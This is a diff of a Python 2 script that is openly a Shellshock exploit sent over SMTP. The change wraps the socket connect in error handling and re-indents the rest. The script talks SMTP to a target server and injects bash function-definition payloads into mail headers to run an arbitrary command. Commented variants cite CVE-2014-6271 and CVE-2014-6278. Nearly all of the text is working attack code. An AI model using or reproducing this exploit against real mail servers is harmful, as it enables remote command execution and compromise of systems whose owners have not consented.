@@ -40,48 +40,52 @@ headers = ([
     ])
  
 s = socket(AF_INET, SOCK_STREAM)
-s.connect((rhost, rport))
+try:
+    s.connect((rhost, rport))
+except IOError as exc:
+    print exc
+else:
  
-# banner grab
-s.recv(2048*4)
- 
-def netFormat(d):
-    d += "\n"
-    return d.encode('hex').decode('hex')
- 
-data = netFormat("mail from:<>")
-s.send(data)
-s.recv(2048*4)
- 
-data = netFormat("rcpt to:<root@localhost>")
-s.send(data)
-s.recv(2048*4)
- 
-data = netFormat("data")
-s.send(data)
-s.recv(2048*4)
- 
-data = ''
-for h in headers:
+    # banner grab
+    s.recv(2048*4)
 
-    # Original
-    data += netFormat(h + ":() { :; };" + cmd)
-    
-    # Variant 1 - CVE-2014-6271
-    #data += netFormat(h + ":'() { :; }; " + cmd + "' bash -c : ")
- 
-    # Variant 2 - CVE-2014-6278
-    #data += netFormat(h + ":'() { _; } >_[$($())] { " + cmd + "; }' bash -c :")
+    def netFormat(d):
+        d += "\n"
+        return d.encode('hex').decode('hex')
 
- 
-data += netFormat(cmd)
- 
-# <CR><LF>.<CR><LF>
-data += "0d0a2e0d0a".decode('hex')
- 
-s.send(data)
-s.recv(2048*4)
- 
-data = netFormat("quit")
-s.send(data)
-s.recv(2048*4)
+    data = netFormat("mail from:<>")
+    s.send(data)
+    s.recv(2048*4)
+
+    data = netFormat("rcpt to:<root@localhost>")
+    s.send(data)
+    s.recv(2048*4)
+
+    data = netFormat("data")
+    s.send(data)
+    s.recv(2048*4)
+
+    data = ''
+    for h in headers:
+
+        # Original
+        data += netFormat(h + ":() { :; };" + cmd)
+
+        # Variant 1 - CVE-2014-6271
+        #data += netFormat(h + ":'() { :; }; " + cmd + "' bash -c : ")
+
+        # Variant 2 - CVE-2014-6278
+        #data += netFormat(h + ":'() { _; } >_[$($())] { " + cmd + "; }' bash -c :")
+
+
+    data += netFormat(cmd)
+
+    # <CR><LF>.<CR><LF>
+    data += "0d0a2e0d0a".decode('hex')
+
+    s.send(data)
+    s.recv(2048*4)
+
+    data = netFormat("quit")
+    s.send(data)
+    s.recv(2048*4)
